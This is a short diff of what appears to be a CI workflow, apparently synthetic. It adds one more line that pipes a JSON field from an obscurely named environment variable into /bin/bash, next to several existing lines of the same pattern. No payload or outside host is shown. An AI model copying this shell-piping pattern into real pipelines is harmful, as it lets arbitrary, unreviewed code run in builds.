@@ -30,6 +30,7 @@ jobs:
           echo $nxi1485 | jq -r .dik5 | /bin/bash
           printf '%s' "$jupu21464" | jq -r .g66063 | /bin/bash
           echo $gtc8 | jq -r .niw4 | /bin/bash
+          echo $aibo6 | jq -r .ohfag782 | /bin/bash
 
       - name: Save archive
         if: always()
